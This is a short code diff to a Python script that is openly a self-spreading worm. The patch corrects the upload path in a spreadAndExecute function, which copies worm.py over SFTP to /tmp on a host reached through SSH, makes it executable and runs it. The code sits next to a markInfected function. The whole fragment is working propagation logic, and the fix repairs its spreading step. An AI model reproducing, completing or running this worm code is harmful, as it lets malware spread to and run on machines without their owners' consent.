@@ -54,7 +54,7 @@ def markInfected():
 def spreadAndExecute(sshClient):
 	
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put("worm.py", "/tmp" + "worm.py")
+	sftpClient.put("worm.py", "/tmp/worm.py")
 	sshClient.exec_command("chmod a+x /tmp/worm.py")
 	sshClient.exec_command("python /tmp/worm.py")
 	# This function takes as a parameter 
